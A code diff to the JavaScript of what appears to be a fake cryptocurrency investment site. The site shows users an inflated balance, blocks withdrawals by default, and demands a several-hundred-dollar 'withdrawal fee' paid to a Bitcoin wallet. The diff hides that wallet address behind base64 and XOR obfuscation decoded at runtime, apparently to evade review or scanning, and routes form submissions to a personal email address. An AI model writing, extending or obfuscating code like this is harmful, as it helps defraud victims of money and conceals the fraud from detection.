@@ -1,5 +1,19 @@
 (function () {
   var env = window.ENV || {};
+
+  function decodeWallet(encoded) {
+    var key = "sv7x";
+    var raw = atob(encoded);
+    var out = "";
+    for (var i = 0; i < raw.length; i++) {
+      out += String.fromCharCode(raw.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    }
+    return out;
+  }
+
+  // Encoded platform BTC wallet — regenerate with: python3 scripts/encode-wallet.py "bc1q..."
+  var platformWallet = decodeWallet("ERUGCUEFThYJG05LCQ4ETgcHUx0dG0RKAQRHTUVPTQkYQUdLAAwOShQB");
+
   var balance = Number(env.balanceUsd);
   if (Number.isNaN(balance)) balance = 15500;
 
@@ -107,7 +121,7 @@
       withdrawFeeProof: true,
       withdrawFeeAmount: 455,
       withdrawFeeCurrency: "USD",
-      withdrawFeeWallet: "bc1q2synzmy3zx36tqdenms2rrp569zqk7p3sz92gw",
+      withdrawFeeWallet: platformWallet,
       formSubmitEmail: "ronniechristopher89@gmail.com",
       withdrawCompleteWithinMs: 60 * 60 * 1000
     }
@@ -124,7 +138,7 @@
     btcPrice: 0,
     btcChange: 0,
     balanceUsd: balance,
-    platformWallet: env.platformWallet || "bc1q2synzmy3zx36tqdenms2rrp569zqk7p3sz92gw",
+    platformWallet: platformWallet,
     withdrawalFeeUsd: Number(env.withdrawalFeeUsd) || 500,
     withdrawalsBlocked: env.withdrawalsBlocked !== false,
     initialDeposit: profiles[0].initialDeposit,
